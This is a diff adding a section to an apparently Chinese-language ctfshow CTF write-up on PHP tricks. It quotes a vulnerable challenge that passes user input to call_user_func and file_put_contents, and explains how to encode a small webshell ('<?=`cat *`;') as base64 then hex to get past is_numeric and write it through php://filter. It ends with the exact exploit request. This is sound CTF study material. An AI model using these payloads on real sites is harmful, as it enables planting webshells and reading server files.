@@ -66,3 +66,31 @@ var_dump(get_class_vars('ctfshow'));
 echo new ReflectionClass('ctfshow');
 ?v1=1&v2=echo new ReflectionClass&v3=;
 ```
+## **is_numeric函数特性**
+```
+$v1 = $_POST['v1'];
+$v2 = $_GET['v2'];
+$v3 = $_GET['v3'];
+$v4 = is_numeric($v2) and is_numeric($v3);
+if($v4){
+    $s = substr($v2,2);
+    $str = call_user_func($v1,$s);
+    echo $str;
+    file_put_contents($v3,$str);
+}
+else{
+    die('hacker');
+}
+
+php5下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，
+但题目环境没配好，是php7的is_numeric不能识别16进制，必须全数字，所以要另换方法。
+
+当用伪协议写入时，将木马先base64编码后转成16进制就是全是数字的字符串！
+$a='<?=`cat *`;';
+$b=base64_encode($a);//$a=PD89YGNhdCAqYDs=
+$c=bin2hex('PD89YGNhdCAqYDs');
+得到5044383959474e6864434171594473
+
+?v2=115044383959474e68644341715944&v3=php://filter/write=convert.base64-decode/resource=1.php
+POST:v1=hex2bin
+```
